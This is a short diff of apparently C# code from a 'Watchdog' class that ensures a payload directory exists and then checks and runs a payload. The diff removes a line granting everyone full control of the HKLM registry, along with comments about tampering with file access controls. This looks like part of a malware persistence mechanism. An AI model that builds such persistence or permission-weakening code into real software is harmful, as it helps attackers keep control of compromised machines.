@@ -43,12 +43,6 @@ class Watchdog
             watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
             watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);
 
-            Persistence.GrantEveryoneFullControl(Registry.LocalMachine);
-            //Persistence.GrantEveryoneFullControl("HKCU"); //Current users not in use at the moment
-
-            // mess with the access control on files and folders
-            // Implement way to deal with folder name changing
-
             watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
             watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);
 
